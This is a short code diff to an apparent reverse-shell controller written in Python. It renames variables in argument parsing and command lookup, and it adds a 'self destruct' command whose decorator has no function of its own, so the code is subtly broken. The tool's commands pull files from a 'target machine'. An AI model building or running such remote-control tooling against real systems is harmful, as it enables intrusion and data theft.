@@ -407,7 +407,7 @@ def parse_args(cmdName, arg_spec, raw_args):
                 parsed.append(None)
                 continue
             else:
-                raise ValueError(f"Missing argument: {cmd_name} <{name}({type_.__name__})>")
+                raise ValueError(f"Missing argument: {cmdName} <{name}({type_.__name__})>")
 
         try:
             parsed.append(type_(raw_args[i]))
@@ -428,9 +428,9 @@ def command(name, arg_spec=None, description=""):
 
 def find_command(parts):
     for length in range(len(parts), 0, -1):
-        cmd_name = " ".join(parts[:length]).lower()
-        if cmd_name in commands:
-            return cmd_name, parts[length:]
+        local_cmd_name = " ".join(parts[:length]).lower()
+        if local_cmd_name in commands:
+            return local_cmd_name, parts[length:]
     return None, parts
 
 
@@ -513,6 +513,8 @@ def cmd_map_connections(cmd):
 @command("type", description="Show the buffer size")
 def cmd_type():
     print(f"[*] The Buffer size is currently set to {BUFFER_SIZE/1000000} MB. If you want to see larger files use the 'download' command.")
+
+@command("self destruct", arg_spec=[("-a", str)], description="Self-destructs the reverse shell")
 
 @command("start file server", description="Start a file server to receive files from the target machine")
 def cmd_start_file_server():
